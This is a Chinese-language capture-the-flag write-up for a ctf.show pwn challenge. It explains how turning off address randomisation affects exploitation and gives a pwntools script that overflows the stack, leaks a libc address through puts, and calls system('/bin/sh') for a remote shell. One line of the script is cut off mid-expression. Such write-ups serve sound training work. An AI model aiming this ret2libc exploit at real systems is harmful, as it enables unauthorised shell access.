# 挑战简介
开启NX，但是如果ALSR = 0 会发生什么？ [由于远程环境问题，关闭此保护容易引起Docker逃逸等问题，此处远程环境ALSR保护等级为2，但是可以在本地更改为0，并看有什么区别]

# 思路
ALSR为0，则意味着地址并未开启随机化，更意味着可以更自由地利用本地gdb调试得出所有函数的具体地址，可以实现直接攻击  

而且此题有栈溢出，也可以用ret2libc

```
from pwn import *
 context.log_level = 'debug'
 #io = process('./pwn')
 io = remote('pwn.challenge.ctf.show',28198)
 elf = ELF('./pwn')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 ###   ALSR = 0 ####
 '''
ret = 0x80483ba # 0x080483ba : ret 
system = 0x7ffff7a31420
 binsh = 0x7ffff7b95d88
 pop_rdi = 0x4007a3  # 0x00000000004007a3 : pop rdi ; ret
 ret = 0x4004c6  # 0x00000000004004c6 : ret 
payload = cyclic(0x40+8) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
 io.send(payload)
 io.recv()
 io.interactive()
 '''
 ### ret2libc ###
 main = elf.sym['main']
 puts_plt = elf.plt['puts']
 puts_got = elf.got['puts']
 pop_rdi = 0x4007a3 # 0x00000000004007a3 : pop rdi ; ret
 ret = 0x4004c6     
# 0x00000000004004c6 : ret
 payload = cyclic(0x40+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ma
 io.recvuntil("Let's go\n")
 io.sendline(payload)
 puts = u64(io.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
 print hex(puts)
 libc_base = puts - libc.sym['puts']
 system = libc_base + libc.sym['system']
 bin_sh = libc_base + next(libc.search(b'/bin/sh'))
 payload = cyclic(0x40+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
 io.recvuntil("Let's go\n")
 io.sendline(payload)
 io.interactive()
```
